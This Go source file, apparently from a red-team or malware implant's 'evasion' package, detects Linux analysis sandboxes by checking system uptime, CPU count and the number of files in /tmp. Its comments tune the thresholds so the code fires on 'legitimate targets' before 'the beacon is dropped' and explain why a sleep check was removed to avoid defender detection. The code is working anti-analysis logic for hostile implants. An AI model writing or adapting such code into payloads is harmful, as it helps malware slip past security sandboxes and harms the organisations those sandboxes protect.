//go:build linux

package evasion

import (
	"fmt"
	"os"
	"path/filepath"
	"runtime"
)

func SandboxDetected() bool {
	if uptimeTooShort() {
		return true
	}
	if cpuCountTooLow() {
		return true
	}
	if tempFileCountTooLow() {
		return true
	}
	return false
}

// uptimeTooShort: 90 seconds. Anything below this is definitively a
// container or VM that was just started. Higher thresholds catch
// legitimate targets — engagement VMs are often provisioned minutes
// before the beacon is dropped.
func uptimeTooShort() bool {
	data, err := os.ReadFile("/proc/uptime")
	if err != nil {
		return false
	}
	var secs float64
	if _, err := fmt.Sscanf(string(data), "%f", &secs); err != nil {
		return false
	}
	return secs < 90
}

// cpuCountTooLow: 1 vCPU is a sandbox tell. 2 is a legitimate VDI or
// cloud instance, so the threshold must not be higher.
func cpuCountTooLow() bool { return runtime.NumCPU() < 2 }

// tempFileCountTooLow: 5 files. A fresh install has an empty /tmp;
// a real user session does not.
func tempFileCountTooLow() bool {
	count := 0
	_ = filepath.Walk("/tmp", func(_ string, fi os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if !fi.IsDir() {
			count++
		}
		return nil
	})
	return count < 5
}

// sleepPatched removed: the 5-second Sleep is itself an observable
// signal (a driver can see the exact NtDelayExecution call), the
// result is unreliable under Go's scheduler, and it costs 5 seconds of
// process lifetime before the first network call.